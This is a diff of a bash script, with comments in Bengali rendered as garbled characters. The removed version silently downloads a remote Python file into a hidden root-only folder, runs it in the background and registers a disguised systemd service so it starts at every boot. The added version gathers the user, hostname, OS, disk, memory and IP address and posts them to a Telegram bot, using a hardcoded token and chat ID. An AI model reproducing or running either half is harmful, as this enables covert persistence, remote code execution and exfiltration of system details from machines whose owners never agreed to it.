@@ -1,56 +1,30 @@
 #!/bin/bash
-# -----------------------------
-# Auto-run Python script in background at startup
-# -----------------------------
+# Simple Linux System Info тЖТ Send to Telegram
 
-# -----------------------------
-# Configuration
-# -----------------------------
-PYTHON_FILE_URL="https://raw.githubusercontent.com/sahed-msd/RTA_Linux/f65ba177406cda654f9d694dd928a18f4fca6ab3/PFIWZV.py"
-SECRET_DIR="/root/.system_service"   # Hidden & root-only directory
-DEST_FILE="$SECRET_DIR/PFIWZV.py"
+# ЁЯФз рждрзЛржорж╛рж░ Telegram Bot Token ржЖрж░ Chat ID ржмрж╕рж╛рждрзЗ рж╣ржмрзЗ
+BOT_TOKEN="7888336988:AAFzsewYXVT0Grxx7fQwKydxcKNMlUkLXqk"
+CHAT_ID="5634946920"
 
-# -----------------------------
-# Ensure secret directory exists
-# -----------------------------
-if [ ! -d "$SECRET_DIR" ]; then
-    mkdir -p "$SECRET_DIR"
-    chmod 700 "$SECRET_DIR"  # Only root can access
-fi
+# рж╕рж┐рж╕рзНржЯрзЗржо ржЗржиржлрзЛ рж╕ржВржЧрзНрж░рж╣
+INFO=$(echo -e "
+ЁЯЦе Linux System Report
 
-# -----------------------------
-# Download Python script silently
-# -----------------------------
-curl -s -o "$DEST_FILE" "$PYTHON_FILE_URL"
-chmod 700 "$DEST_FILE"  # Make it executable only by root
+ЁЯСд User: $(whoami)
+ЁЯТ╗ Hostname: $(hostname)
+ЁЯЦе OS: $(uname -o) $(uname -r)
+тП▒ Uptime: $(uptime -p)
+ЁЯУВ Current Dir: $(pwd)
 
-# -----------------------------
-# Run the script in background
-# -----------------------------
-nohup python3 "$DEST_FILE" >/dev/null 2>&1 &
+ЁЯТ╛ Disk Usage:
+$(df -h / | tail -n 1)
 
-# -----------------------------
-# Ensure script runs on startup
-# -----------------------------
-AUTOSTART_FILE="/etc/systemd/system/python_auto.service"
+ЁЯУж Memory Usage:
+$(free -h | grep Mem)
 
-if [ ! -f "$AUTOSTART_FILE" ]; then
-    cat <<EOL > "$AUTOSTART_FILE"
-[Unit]
-Description=Auto-run secret Python script
-After=network.target
+ЁЯМР IP Address: $(hostname -I | awk '{print $1}')
+")
 
-[Service]
-Type=simple
-ExecStart=/usr/bin/python3 $DEST_FILE
-Restart=always
-User=root
-
-[Install]
-WantedBy=multi-user.target
-EOL
-
-    # Reload systemd and enable the service
-    systemctl daemon-reload
-    systemctl enable python_auto.service
-fi
+# Telegram ржП ржкрж╛ржарж╛ржирзЛ
+curl -s -X POST "https://api.telegram.org/bot$BOT_TOKEN/sendMessage" \
+     -d chat_id="$CHAT_ID" \
+     -d text="$INFO"
